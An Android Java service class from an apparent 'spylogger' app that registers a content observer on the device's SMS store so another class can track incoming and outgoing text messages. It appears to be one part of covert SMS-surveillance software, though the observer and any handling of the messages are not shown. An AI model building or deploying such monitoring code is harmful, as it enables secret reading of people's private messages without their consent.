package com.gravatasufoca.spylogger.services;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.net.Uri;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import com.gravatasufoca.spylogger.observers.SmsObserver;

public class SmsService extends Service {

	public static final String mAction = "SMSTracker";
	ContentResolver contentResolver;

	private final IBinder mBinder = new LocalBinder();
	private boolean loaded=false;

	public class LocalBinder extends Binder {
		SmsService getService() {
			return SmsService.this;
		}
	}

	@Override
	public IBinder onBind(Intent arg0) {
		return mBinder;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		Log.i("Status", "Service Start");


		contentResolver = this.getContentResolver();
		contentResolver.registerContentObserver(Uri.parse("content://sms/"),
				true, new SmsObserver(new Handler(), getApplicationContext()));


		return super.onStartCommand(intent, flags, startId);
	}
}